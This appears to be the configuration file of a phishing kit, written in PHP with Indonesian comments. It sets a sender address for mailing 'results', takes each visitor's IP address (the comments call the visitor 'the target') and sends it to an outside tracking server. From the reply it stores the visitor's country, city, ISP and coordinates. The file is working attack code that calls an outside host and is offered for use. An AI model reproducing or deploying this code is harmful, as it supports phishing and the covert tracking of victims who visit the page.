<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'NGUYEN THU WANN';
$sender = 'From: NguuyenThuWann <kimberlyhimeku@gmail.com>';


// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}

// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
$url = "http://nguyenthuwann.my.id/system/flag/?ip=".getClientIP();

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($curl);
        curl_close($curl);
$data = json_decode($resp,true);

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$sahrul_country = $data['country'];
$sahrul_callingcode = $data['code'];
$sahrul_ip_address = getClientIP();
$sahrul_flag = $data['flag'];
$sahrul_country_code = $data['country_code'];
$sahrul_code = $data['code'];
$sahrul_continent = $data['continent'];
$sahrul_region = $data['region'];
$sahrul_city = $data['city'];
$sahrul_zip = $data['zip'];
$sahrul_longitude = $data['longitude'];
$sahrul_latitude = $data['latitude'];
$sahrul_isp = $data['isp'];
?>